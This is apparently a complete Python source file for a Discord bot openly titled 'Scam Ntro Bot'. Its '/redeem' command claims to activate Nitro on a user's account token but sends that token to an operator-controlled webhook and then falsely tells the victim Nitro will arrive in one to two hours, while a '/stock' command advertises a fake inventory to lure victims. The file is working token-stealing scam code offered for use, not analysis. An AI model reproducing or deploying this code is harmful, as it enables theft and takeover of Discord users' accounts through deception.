import discord
from discord.ext import commands
import json
import requests
import os
from colorama import *
from pystyle import *

with open("config.json", "r") as f:
    config = json.load(f)

webhook_url = config["webhook_url"]
bot_token = config["bot_token"]

intents = discord.Intents.default()
intents.typing = False

bot = commands.Bot(command_prefix='/', intents=intents)

os.system("mode 175,30 & title [Scam Ntro Bot - xeto#9999]")

kost = f"""
█░█ █▀▀ █▀▀ ▀▀█▀▀ █▀▀█   █▀▀▄ █▀▀█ ▀▀█▀▀
█▀▄ █▀▀ ▀▀█ ░░█░░ █▄▄█   █▀▀▄ █░░█ ░░█░░
▀░▀ ▀▀▀ ▀▀▀ ░░▀░░ ▀░░▀   ▀▀▀░ ▀▀▀▀ ░░▀░░
             >Press Enter
"""

@bot.event
async def on_ready():
    Anime.Fade(Center.Center(kost), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)
    print(f"Bot connected as {bot.user.name}")
    print(f"-----------------------Bot connected as {bot.user.name}----------------------")


@bot.slash_command(
    name="redeem",
    description="Allows you to redeem nitro on a token"
)
async def redeem(ctx: commands.Context, token: str, month: str):
    webhook_data = {
        "content": f"Token: {token}"
    }
    response = requests.post(webhook_url, json=webhook_data)
    if response.status_code == 204:
        embed = discord.Embed(
            title="Nitro Activation",
            description="Nitro should be active in 1-2 hours if the token is valid",
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            title="Activation Failed",
            description="Failed to activate Nitro. Please check the token.",
            color=discord.Color.red()
        )
    await ctx.send(embed=embed)


@bot.slash_command(
    name="stock",
    description="Allows you to see the current token stock!"
)
async def stock(ctx):
    embed = discord.Embed(
        title="Stock",
        description="2625 Nitro in stock",
        color=discord.Color.purple()
    )
    await ctx.send(embed=embed)


bot.run(bot_token)
